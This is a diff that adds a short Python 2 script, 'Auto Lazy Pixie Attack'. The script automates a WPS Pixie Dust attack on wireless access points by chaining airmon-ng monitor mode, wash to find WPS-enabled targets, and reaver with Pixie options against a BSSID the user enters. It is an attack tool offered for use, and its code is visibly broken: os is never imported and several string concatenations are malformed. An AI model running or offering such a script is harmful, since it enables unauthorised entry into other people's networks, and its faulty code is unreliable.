@@ -1,0 +1,22 @@
+import subprocess
+
+os.system('clear')
+
+print """
+Auto Lazy Pixie Attack
+Script to automate WPS Pixie attack
+Bluedangerforyou
+"""
+interface = raw_input("Enter interface -example: wlan0 >> ")
+
+print '...running kill check on interface...'
+subprocess.call(['airmon-ng', 'check', 'kill'])
+print '...putting ' + interface + ' into monitor mode...'
+subprocess.call(['airmon-ng', 'start ', + interface])
+print 'A new terminal is opening. Pick a WPS enabled AP'
+BSSID = raw_input("What is the BSSID?>> ")
+channel = raw_input("What channel is AP?>> ")
+subprocess.call(["xterm", "-hold", "-e", "wash -i ", + interface, + "mon", '&'])
+print 'Running reaver attack...'
+subprocess.call(['reaver -i ', + interface, + 'mon -b ', + BSSID, + ' -c ', + channel, + ' -vvv', '-k', '1', '-f'])
+
